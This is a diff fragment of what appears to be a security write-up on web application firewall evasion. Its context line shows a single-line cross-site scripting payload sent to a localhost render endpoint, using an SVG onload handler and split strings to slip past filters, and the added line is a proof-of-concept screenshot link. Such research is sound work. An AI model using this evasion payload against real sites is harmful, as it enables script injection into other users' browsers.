@@ -40,3 +40,5 @@ Combining all the distinct evasion vectors yields a single-line final payload th
 
 ```text
 http://localhost:9000/render?path=<svg/onload=top['al'%2B'ert']`GRID_NODE:_`%2Blocation.host>
+
+![WAF Evasion Success](../images/poc.png)
